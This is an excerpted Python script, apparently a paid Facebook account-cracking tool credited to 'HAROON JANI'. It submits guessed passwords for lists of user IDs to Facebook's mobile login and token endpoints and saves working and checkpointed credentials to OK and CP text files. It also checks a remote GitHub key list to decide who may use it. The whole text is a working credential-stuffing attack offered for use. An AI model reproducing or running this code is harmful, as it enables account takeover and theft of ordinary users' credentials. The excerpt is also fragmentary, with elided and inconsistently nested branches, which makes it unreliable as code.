...
'\x1b[0;37m'   Author      :      HAROON JANI-PAID
'\x1b[0;37m'   Github      :      Afg Hacker93  
'\x1b[0;37m'   FB ID       :      HAROON JANI
'\x1b[0;37m'   TOOL TYPE   :PAID TOOL
'\x1b[0;37m'   WAP NUMBER  :    +93776811468         
"""
dec="2"
server="2"
...
def main_apv():
    ...
    r1=requests.get("https://raw.githubusercontent.com/N00B-D3C0MP1L3R/0P3N_S0URC3_C0D3/main/Bypass.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[0;37m        Member In Imtiaz Paid Commands ")
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[HAROON-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[0;37m[HAROON-CP] "+coc+user + " | " + pass1
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[HAROON-OK] "+uid + " | " + pass1
                ok=open('HAROON-OK.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[0;37m[HAROON-CP] "+uid + " | " + pass1
                    cp=open('HAROON-CP.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;93m[HAROON-OK] "+uid + " | " + pass2
                        ok=open('HAROON-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[0;37m[HAROON-CP] "+uid + " | " + pass2
                            cp=open('HAROON-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;93m[HAROON-OK] "+uid + " | " + pass3
                                ok=open('HAROON-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[0;37m[HAROON-CP] "+uid + " | " + pass3
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;93m[HAROON-OK] "+uid + " | " + pass4
                                        ok=open('HAROON-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[0;37m[HAROON-CP] "+uid + " | " + pass4
                                            cp=open('HAROON-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;93m[HAROON-OK] "+uid + " | " + pass5
                                                ok=open('HAROON-OK.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[0;37m[HAROON-CP] "+uid + " | " + pass5
                                                    cp=open('HAROON-CP.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def xoknp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;93m[ZEESHAN-OK] "+uid + " | " + pass1
    ...
    def main(arg):
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[0;37m[ZEESHAN-CP] "+uid + " | " + pass1
                    ...
                    q = json.loads(data)
                    if "access_token" in q:
                        print "\x1b[1;93m[ZEESHAN-OK] "+uid + " | " + pass2
                        ok=open('ZEESHAN-OK.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[0;37m[ZEESHAN-CP] "+uid + " | " + pass2
                            cp=open('ZEESHAN-CP.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            q = json.loads(data)
                            if "access_token" in q:
                                print "\x1b[1;93m[ZEESHAN-OK] "+uid + " | " + pass3
                                ok=open('ZEESHAN-OK.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                                ...
                                if "www.facebook.com" in q ["error_msg"]:
                                    print "\x1b[0;37m[ZEESHAN-CP] "+uid + " | " + pass3
                                    cp=open('ZEESHAN-CP.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print "\x1b[1;93m[ZEESHAN-OK] "+uid + " | " + pass4
                                        ok=open('ZEESHAN-OK.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                        ...
                                        if "www.facebook.com" in q ["error_msg"]:
                                            print "\x1b[0;37m[ZEESHAN-CP] "+uid + " | " + pass4
                                            cp=open('ZEESHAN-CP.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;93m[HAROON-OK] "+uid + " | " + pass6
                                                        ok=open('HAROON-OK.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[0;37m[HAROON-CP] "+uid + " | " + pass6
                                                            cp=open('HAROON-CP.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
